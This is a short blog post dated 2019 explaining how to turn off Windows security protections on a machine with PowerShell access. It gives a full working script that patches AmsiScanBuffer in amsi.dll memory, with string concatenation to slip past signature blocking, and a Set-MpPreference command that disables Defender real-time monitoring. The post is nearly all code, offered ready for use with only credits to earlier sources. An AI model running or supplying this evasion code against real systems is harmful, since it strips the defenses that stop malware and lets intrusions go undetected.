---
title: Bypassing Windows Defender and AMSI 2019 With Privileges
date: 2019-09-23
draft: false
description: How to bypass Windows Defender and AMSI
---
These steps assume you have access to powershell with admin rights. For the record, I’m not sure if this will work on a domain joined machine where conflicting policies may have been set. The AMSI script works by patching the AMSI DLL in memory, which means it’s not persistent and does not require privileges. The Defender command changes a registry value, which means it is persistend and it also requires privileges.

Disable AMSI

`$win32 = @"`  
`using System.Runtime.InteropServices;`  
`using System;`  
`public class Win32 {`  
`[DllImport("kernel32")]`  
`public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);`  
`[DllImport("kernel32")]`  
`public static extern IntPtr LoadLibrary(string name);`  
`[DllImport("kernel32")]`  
`public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect`  
`);`  
`}`  
`"@`  
`Add-Type $win32`  
`# String Concatenation to bypass blacklist`  
`$ptr = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScan"+"Buffer")`  
`$b = 0`  
`[Win32]::VirtualProtect($ptr, [UInt32]5, 0x40, [Ref]$b)`  
`$buf = New-Object Byte[] 7`  
`$buf[0] = 0x66; $buf[1] = 0xb8; $buf[2] = 0x01; $buf[3] = 0x00; $buf[4] = 0xc2; $buf[5] = 0x18; $buf[6] = 0x00;`  
`[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 7)`

Credit to [Avi Gimpel](https://web.archive.org/web/20220520135811/https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/), the exact code in his blog post no longer works because it contains “AmsiScanBuffer” but with a little concatenation it still works great!

Disable Defender

`PowerShell Set-MpPreference -DisableRealtimeMonitoring 1`

Credit to [Shawn Brink](https://web.archive.org/web/20220520135811/https://www.tenforums.com/tutorials/3569-turn-off-windows-defender-real-time-protection-windows-10-a.html#option5)